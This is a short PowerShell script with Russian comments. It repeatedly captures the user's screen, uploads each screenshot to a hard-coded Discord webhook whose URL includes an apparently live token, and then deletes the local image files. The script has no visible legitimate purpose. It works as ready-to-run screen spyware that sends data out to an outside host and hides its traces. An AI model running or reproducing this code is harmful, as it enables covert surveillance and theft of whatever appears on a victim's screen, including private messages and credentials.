# Ваш Discord Webhook
$discordWebhook = "https://discord.com/api/webhooks/1322650192167571546/rRqmLmhnGEGEb_XjA5hKngL-VDDiEgz1KbkYMEk-nb_Jb4WAYGFDYCtvL1NpD-keR94M"

# Настройки
$screenShots = 10
$timing = 5

# Загрузим необходимые типы для работы с изображениями и захватом экрана
Add-Type -TypeDefinition @"
using System;
using System.Drawing;
using System.Windows.Forms;
public class ScreenCapture {
    public static Bitmap CaptureScreen() {
        Rectangle bounds = Screen.PrimaryScreen.Bounds;
        Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
        using (Graphics g = Graphics.FromImage(bitmap)) {
            g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
        }
        return bitmap;
    }
}
"@

# Снимаем и отправляем скриншоты
for ($i = 1; $i -le $screenShots; $i++) {
    Start-Sleep -Seconds $timing

    # Захватить скриншот
    $screenshot = [ScreenCapture]::CaptureScreen()
    
    # Сохраняем скриншот в файл
    $screenshotFile = "screenshot_$i.png"
    $screenshot.Save($screenshotFile, [System.Drawing.Imaging.ImageFormat]::Png)
    
    # Чтение файла скриншота
    $fileBytes = [System.IO.File]::ReadAllBytes($screenshotFile)
    
    # Подготовка данных для отправки в Discord
    $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
    $content = New-Object System.Net.Http.ByteArrayContent($fileBytes)
    $content.Headers.Add("Content-Type", "image/png")
    $multipartContent.Add($content, "file", $screenshotFile)

    # Отправить скриншот через Discord Webhook
    $httpClient = New-Object System.Net.Http.HttpClient
    $response = $httpClient.PostAsync($discordWebhook, $multipartContent).Result

    # Проверка статуса
    if ($response.IsSuccessStatusCode) {
        Write-Host "Photo $i successfully sent!"
    } else {
        Write-Host "Error while sending photo $i."
    }

    # Удалить временный файл скриншота
    Remove-Item $screenshotFile
}
